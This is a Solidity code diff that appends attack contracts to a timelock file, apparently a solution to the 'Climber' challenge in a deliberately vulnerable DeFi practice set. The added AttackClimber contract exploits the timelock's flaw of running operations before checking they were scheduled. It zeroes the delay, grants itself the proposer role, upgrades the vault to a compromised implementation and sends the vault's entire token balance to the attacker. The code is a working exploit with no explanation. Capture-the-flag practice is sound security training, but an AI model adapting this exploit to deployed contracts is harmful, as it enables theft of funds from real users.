@@ -3,6 +3,7 @@ pragma solidity ^0.8.0;
 
 import "@openzeppelin/contracts/access/AccessControl.sol";
 import "@openzeppelin/contracts/utils/Address.sol";
+import "./ClimberVault.sol";
 
 /**
  * @title ClimberTimelock
@@ -117,3 +118,79 @@ contract ClimberTimelock is AccessControl {
 
     receive() external payable {}
 }
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
+
+contract ClimberVaultCompromised is ClimberVault{
+    function attack(address _tokenAddress, address _attacker) external{
+        IERC20 _token = IERC20(_tokenAddress);
+        require(_token.transfer(_attacker, _token.balanceOf(address(this))), "Transfer failed");
+    }
+}
+contract AttackClimber {
+    ClimberTimelock public timelock;
+    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
+    bytes32 salt = keccak256(abi.encode(0));
+    constructor(address payable _timelock) {
+        timelock = ClimberTimelock(payable(_timelock));
+    }
+    function _getDataElements(
+        address[] memory _targets, 
+        uint256[] memory _values
+    ) internal view returns(bytes[] memory){
+        bytes[] memory _dataElements = new bytes[](3);
+        _dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);
+        _dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector, PROPOSER_ROLE, address(this));
+        _dataElements[2] = abi.encodeWithSelector(AttackClimber.schedule.selector, _targets, _values);
+        return(_dataElements);
+    }
+    function attack (
+        address _newImplementation,
+        address[] memory _targets, 
+        uint256[] memory _values,
+        address _vault,
+        address _token
+    ) external {
+        address[] memory _target = new address[](1);
+        uint256[] memory _value = new uint256[](1);
+        bytes[] memory _dataElement = new bytes[](1);
+        _target[0] = _vault;
+        _value[0] = 0;
+        _dataElement[0] = abi.encodeWithSelector(
+            UUPSUpgradeable.upgradeToAndCall.selector,
+             _newImplementation,
+             abi.encodeWithSelector(ClimberVaultCompromised.attack.selector, _token, msg.sender)
+        );
+        timelock.execute(
+            _targets,
+            _values,
+            _getDataElements(_targets, _values),
+            salt
+        );
+        timelock.schedule(
+            _target,
+            _value,
+            _dataElement,
+            salt
+        );
+        timelock.execute(
+            _target,
+            _value,
+            _dataElement,
+            salt
+        );
+    }
+    function schedule(
+        address[] memory _targets,
+        uint256[] memory _values
+    ) external {
+        timelock.schedule(
+            _targets,
+            _values,
+            _getDataElements(_targets, _values),
+            salt
+        );
+    }
+}
+
+
